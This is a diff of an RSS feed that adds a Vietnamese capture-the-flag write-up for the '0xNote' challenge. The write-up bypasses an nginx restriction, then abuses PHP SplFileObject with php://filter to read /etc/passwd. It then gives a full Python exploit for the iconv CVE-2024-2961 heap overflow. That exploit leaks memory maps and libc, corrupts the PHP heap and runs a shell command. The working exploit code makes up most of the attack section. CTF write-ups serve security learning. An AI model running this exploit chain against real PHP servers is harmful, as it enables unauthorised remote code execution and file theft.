@@ -112,7 +112,468 @@ COPY readflag.c /readflag.c
 RUN gcc /readflag.c -o /readflag
 RUN chmod u+s /readflag
 RUN rm -f /readflag.c
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Đặt &lt;code&gt;SUID&lt;/code&gt; lên &lt;code&gt;/readflag&lt;/code&gt; nên user ở &lt;code&gt; www-data&lt;/code&gt; không thể đọc&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761494653599-tung/featured.png"/></item><item><title>PACKAGES</title><link>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</guid><description>&lt;h1 class="relative group"&gt;PACKAGES
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Đặt &lt;code&gt;SUID&lt;/code&gt; lên &lt;code&gt;/readflag&lt;/code&gt; nên user ở &lt;code&gt; www-data&lt;/code&gt; không thể đọc&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761494653599-tung/featured.png"/></item><item><title>OxL4ugh CTF</title><link>https://mtasecurity.github.io/MSEC/web/0xl4ugh/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/0xl4ugh/</guid><description>&lt;h1 class="relative group"&gt;0xNote
+&lt;div id="0xnote" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#0xnote" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;
+&lt;p&gt;&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/ryOk1sVIWx.png"
+&gt;&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Overview
+&lt;div id="overview" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Backend : &lt;strong&gt;fpm&lt;/strong&gt;
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/SJSBJj4U-l.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Proxy : &lt;strong&gt;nginx&lt;/strong&gt;
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/HkQCko4LZl.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Giao diện
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/SkCqlsE8be.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Tuy nhiên bị chặn ở &lt;code&gt;/premium.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 class="relative group"&gt;Solve
+&lt;div id="solve" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solve" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Với cách viết proxy như sau ta có thể bypass bằng việc thêm &lt;code&gt;index.php&lt;/code&gt; ngay sau thư mục mà ta bị chặn (&lt;code&gt;premium.php&lt;/code&gt;)
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/BkGVeoVI-x.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a
+href="https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm"
+target="_blank"
+&gt;Cách bypass ở đây&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Sau khi vào được &lt;code&gt;/premium.php&lt;/code&gt; bằng &lt;code&gt;/premium.php/index.php&lt;/code&gt; ta thấy được ứng dụng set color không fillter input người dùng&lt;/li&gt;
+&lt;li&gt;Như đoạn code sau nếu có thể kiểm soát được &lt;code&gt;color&lt;/code&gt; và &lt;code&gt;note&lt;/code&gt; thì có thể tạo ra 1 object mới :
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/rkKAWiNL-e.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 class="relative group"&gt;Exploit
+&lt;div id="exploit" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#exploit" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì&lt;/li&gt;
+&lt;li&gt;Set path : &lt;code&gt;php://filter/convert.base64-encode/resource=/etc/passwd&lt;/code&gt;
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/Sy_7VjNUZx.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Set Classname
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/H1PwVjEIWl.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Đọc kết quả
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/rkbq4sV8Wx.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Auket lấy được &lt;code&gt;etc/passwd&lt;/code&gt; tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/rJzRNiVUZg.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 class="relative group"&gt;Nâng quyền
+&lt;div id="nâng-quyền" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#n%c3%a2ng-quy%e1%bb%81n" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Ngay khi thực hiện được &lt;code&gt;SPLFileObject&lt;/code&gt; như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ &lt;a
+href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py"
+target="_blank"
+&gt;đoạn tài liệu sau&lt;/a&gt; và &lt;a
+href="https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html"
+target="_blank"
+&gt;cái này&lt;/a&gt;
+&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/SJfsHsVIZl.png"
+&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào &lt;code&gt;http://localhost:5000/&lt;/code&gt; để check id&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-php=" data-lang="php="&gt;import requests
+from pwn import *
+import re
+import base64
+import zlib
+from bs4 import BeautifulSoup
+session = requests.Session()
+## Constant
+HEAP_SIZE = 2 * 1024 * 1024
+BUG = &amp;#34;劄&amp;#34;.encode(&amp;#34;utf-8&amp;#34;)
+## Post init function
+def get_file(url, path):
+path = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;
+r = session.post(url + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})
+r = session.post(url + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;:path})
+r = session.post(url + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})
+r = session.get(url + &amp;#39;index.php&amp;#39;)
+soup = BeautifulSoup(r.text, &amp;#34;html.parser&amp;#34;)
+data = soup.find(&amp;#34;div&amp;#34;, id=&amp;#34;noteContent&amp;#34;).get_text(strip=True)
+return base64.b64decode(data)
+def compress(data):
+return zlib.compress(data, 9)[2:-4]
+def compressed_bucket(data):
+return chunked_chunk(data, 0x8000)
+def qpe(data):
+return &amp;#34;&amp;#34;.join(f&amp;#34;={x:02x}&amp;#34; for x in data).upper().encode()
+def ptr_bucket(*ptrs, size=None):
+if size is not None:
+assert len(ptrs) * 8 == size
+bucket = b&amp;#34;&amp;#34;.join(map(p64, ptrs))
+bucket = qpe(bucket)
+bucket = chunked_chunk(bucket)
+bucket = chunked_chunk(bucket)
+bucket = chunked_chunk(bucket)
+bucket = compressed_bucket(bucket)
+return bucket
+def chunked_chunk(data, size: int = None):
+if size is None:
+size = len(data) + 8
+keep = len(data) + len(b&amp;#34;\n\n&amp;#34;)
+size = f&amp;#34;{len(data):x}&amp;#34;.rjust(size - keep, &amp;#34;0&amp;#34;)
+return size.encode() + b&amp;#34;\n&amp;#34; + data + b&amp;#34;\n&amp;#34;
+## Pwn core
+class PWN_Core():
+def __init__(self, url, command) -&amp;gt; None:
+self.url = url
+self.command = command
+self.info = {}
+self.heap = None
+self.pad = 20
+class Region():
+def __init__(self, start, stop, permissions, path):
+self.start = int(start)
+self.stop = int(stop)
+self.permissions = permissions
+self.path = path
+@property
+def size(self) -&amp;gt; int:
+return self.stop - self.start
+def download_file(self, remote_path: str, local_path: str) -&amp;gt; None:
+data = get_file(self.url, remote_path)
+Path(local_path).write_bytes(data)
+def get_regions(self):
+maps = get_file(self.url, &amp;#34;/proc/self/maps&amp;#34;)
+maps = maps.decode()
+PATTERN = re.compile(
+r&amp;#34;^([a-f0-9]+)-([a-f0-9]+)\b&amp;#34; r&amp;#34;.*&amp;#34; r&amp;#34;\s([-rwx]{3}[ps])\s&amp;#34; r&amp;#34;(.*)&amp;#34;
+)
+regions = []
+for region in [line.strip() for line in maps.strip().split(&amp;#39;\n&amp;#39;)]:
+if match := PATTERN.match(region):
+start = int(match.group(1), 16)
+stop = int(match.group(2), 16)
+permissions = match.group(3)
+path = match.group(4)
+if &amp;#34;/&amp;#34; in path or &amp;#34;[&amp;#34; in path:
+path = path.rsplit(&amp;#34; &amp;#34;, 1)[-1]
+else:
+path = &amp;#34;&amp;#34;
+current = self.Region(start, stop, permissions, path)
+regions.append(current)
+else:
+print(maps)
+return regions
+def _get_region(self, regions: list[Region], *names: str) -&amp;gt; Region:
+for region in regions:
+if any(name in region.path for name in names):
+break
+return region
+def find_main_heap(self, regions):
+heaps = [
+region.stop - HEAP_SIZE + 0x40
+for region in reversed(regions)
+if region.permissions == &amp;#34;rw-p&amp;#34;
+and region.size &amp;gt;= HEAP_SIZE
+and region.stop &amp;amp; (HEAP_SIZE-1) == 0
+and region.path in (&amp;#34;&amp;#34;, &amp;#34;[anon:zend_alloc]&amp;#34;)
+]
+first = heaps[0]
+if len(heaps) &amp;gt; 1:
+heaps = &amp;#34;, &amp;#34;.join(map(hex, heaps))
+return first
+def get_symbols_and_addresses(self) -&amp;gt; None:
+regions = self.get_regions()
+LIBC_FILE = &amp;#34;./libc&amp;#34;
+self.info[&amp;#34;heap&amp;#34;] = self.find_main_heap(regions)
+libc = self._get_region(regions, &amp;#34;libc-&amp;#34;, &amp;#34;libc.so&amp;#34;)
+self.download_file(libc.path, LIBC_FILE)
+self.info[&amp;#34;libc&amp;#34;] = ELF(LIBC_FILE, checksec=False)
+self.info[&amp;#34;libc&amp;#34;].address = libc.start
+def build_exploit_path(self):
+self.get_symbols_and_addresses()
+LIBC = self.info[&amp;#34;libc&amp;#34;]
+ADDR_EMALLOC = LIBC.symbols[&amp;#34;__libc_malloc&amp;#34;]
+ADDR_EFREE = LIBC.symbols[&amp;#34;__libc_system&amp;#34;]
+ADDR_EREALLOC = LIBC.symbols[&amp;#34;__libc_realloc&amp;#34;]
+ADDR_HEAP = self.info[&amp;#34;heap&amp;#34;]
+ADDR_FREE_SLOT = ADDR_HEAP + 0x20
+ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
+ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+CS = 0x100
+pad_size = CS - 0x18
+pad = b&amp;#34;\x00&amp;#34; * pad_size
+pad = chunked_chunk(pad, len(pad) + 6)
+pad = chunked_chunk(pad, len(pad) + 6)
+pad = chunked_chunk(pad, len(pad) + 6)
+pad = compressed_bucket(pad)
+step1_size = 1
+step1 = b&amp;#34;\x00&amp;#34; * step1_size
+step1 = chunked_chunk(step1)
+step1 = chunked_chunk(step1)
+step1 = chunked_chunk(step1, CS)
+step1 = compressed_bucket(step1)
+step2_size = 0x48
+step2 = b&amp;#34;\x00&amp;#34; * (step2_size + 8)
+step2 = chunked_chunk(step2, CS)
+step2 = chunked_chunk(step2)
+step2 = compressed_bucket(step2)
+step2_write_ptr = b&amp;#34;0\n&amp;#34;.ljust(step2_size, b&amp;#34;\x00&amp;#34;) + p64(ADDR_FAKE_BIN)
+step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+step2_write_ptr = chunked_chunk(step2_write_ptr)
+step2_write_ptr = compressed_bucket(step2_write_ptr)
+step3_size = CS
+step3 = b&amp;#34;\x00&amp;#34; * step3_size
+assert len(step3) == CS
+step3 = chunked_chunk(step3)
+step3 = chunked_chunk(step3)
+step3 = chunked_chunk(step3)
+step3 = compressed_bucket(step3)
+step3_overflow = b&amp;#34;\x00&amp;#34; * (step3_size - len(BUG)) + BUG
+assert len(step3_overflow) == CS
+step3_overflow = chunked_chunk(step3_overflow)
+step3_overflow = chunked_chunk(step3_overflow)
+step3_overflow = chunked_chunk(step3_overflow)
+step3_overflow = compressed_bucket(step3_overflow)
+step4_size = CS
+step4 = b&amp;#34;=00&amp;#34; + b&amp;#34;\x00&amp;#34; * (step4_size - 1)
+step4 = chunked_chunk(step4)
+step4 = chunked_chunk(step4)
+step4 = chunked_chunk(step4)
+step4 = compressed_bucket(step4)
+step4_pwn = ptr_bucket(
+0x200000,
+0,
+# free_slot
+0,
+0,
+ADDR_CUSTOM_HEAP, # 0x18
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+ADDR_HEAP, # 0x140
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+0,
+size=CS,
+)
+step4_custom_heap = ptr_bucket(
+ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+)
+step4_use_custom_heap_size = 0x140
+COMMAND = self.command
+COMMAND = f&amp;#34;kill -9 $PPID; {COMMAND}&amp;#34;
+COMMAND = COMMAND.encode() + b&amp;#34;\x00&amp;#34;
+COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&amp;#34;\x00&amp;#34;)
+step4_use_custom_heap = COMMAND
+step4_use_custom_heap = qpe(step4_use_custom_heap)
+step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+pages = (
+step4 * 3
++ step4_pwn
++ step4_custom_heap
++ step4_use_custom_heap
++ step3_overflow
++ pad * self.pad
++ step1 * 3
++ step2_write_ptr
++ step2 * 2
+)
+resource = compress(compress(pages))
+resource = base64.b64encode(resource).decode()
+resource = f&amp;#34;data:text/plain;base64,{resource}&amp;#34;
+filters = [
+# Create buckets
+&amp;#34;zlib.inflate&amp;#34;,
+&amp;#34;zlib.inflate&amp;#34;,
+# Step 0: Setup heap
+&amp;#34;dechunk&amp;#34;,
+&amp;#34;convert.iconv.L1.L1&amp;#34;,
+# Step 1: Reverse FL order
+&amp;#34;dechunk&amp;#34;,
+&amp;#34;convert.iconv.L1.L1&amp;#34;,
+# Step 2: Put fake pointer and make FL order back to normal
+&amp;#34;dechunk&amp;#34;,
+&amp;#34;convert.iconv.L1.L1&amp;#34;,
+# Step 3: Trigger overflow
+&amp;#34;dechunk&amp;#34;,
+&amp;#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&amp;#34;,
+# Step 4: Allocate at arbitrary address and change zend_mm_heap
+&amp;#34;convert.quoted-printable-decode&amp;#34;,
+&amp;#34;convert.iconv.L1.L1&amp;#34;,
+]
+filters = &amp;#34;|&amp;#34;.join(filters)
+path = f&amp;#34;php://filter/read={filters}/resource={resource}&amp;#34;
+return path
+def solve():
+URL = &amp;#39;http://localhost:5000/&amp;#39;
+command = &amp;#39;id &amp;gt; /tmp/check_id&amp;#39;
+print(f&amp;#39;[+] Build payload với lệnh: {command}&amp;#39;)
+path = PWN_Core(URL, command).build_exploit_path()
+# 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
+try:
+print(&amp;#39;[*] Đang gửi payload kích hoạt RCE...&amp;#39;)
+# Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
+# Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
+# Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
+exploit_payload = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;
+session.post(URL + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})
+session.post(URL + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;: exploit_payload})
+session.post(URL + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})
+session.get(URL + &amp;#39;index.php&amp;#39;, timeout=5) # Kích hoạt exploit
+except Exception as e:
+# Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
+print(f&amp;#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&amp;#39;)
+# 3. Đợi hệ thống đồng bộ file
+import time
+print(&amp;#39;[*] Đợi 2 giây để lệnh thực thi xong...&amp;#39;)
+time.sleep(2)
+# 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
+print(&amp;#39;[*] Đang đọc kết quả từ /tmp/check_id...&amp;#39;)
+try:
+# Dùng chính tính năng SplFileObject để đọc file kết quả
+result = get_file(URL, &amp;#34;/tmp/check_id&amp;#34;)
+if result:
+print(&amp;#39;\n[+] KẾT QUẢ COMMAND ID:&amp;#39;)
+print(&amp;#39;=&amp;#39;*40)
+print(result.decode(&amp;#39;utf-8&amp;#39;).strip())
+print(&amp;#39;=&amp;#39;*40)
+else:
+print(&amp;#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&amp;#39;)
+except Exception as e:
+print(f&amp;#39;[-] Lỗi khi đọc file kết quả: {e}&amp;#39;)
+if __name__ == &amp;#34;__main__&amp;#34;:
+solve()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;img
+class="my-0 rounded-md"
+loading="lazy"
+decoding="async"
+fetchpriority="low"
+alt="image"
+src="https://hackmd.io/_uploads/SyU18T4I-g.png"
+&gt;&lt;/figure&gt;
+&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/0xl4ugh/featured.png"/></item><item><title>PACKAGES</title><link>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</guid><description>&lt;h1 class="relative group"&gt;PACKAGES
 &lt;div id="packages" class="anchor"&gt;&lt;/div&gt;
 &lt;span
 class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
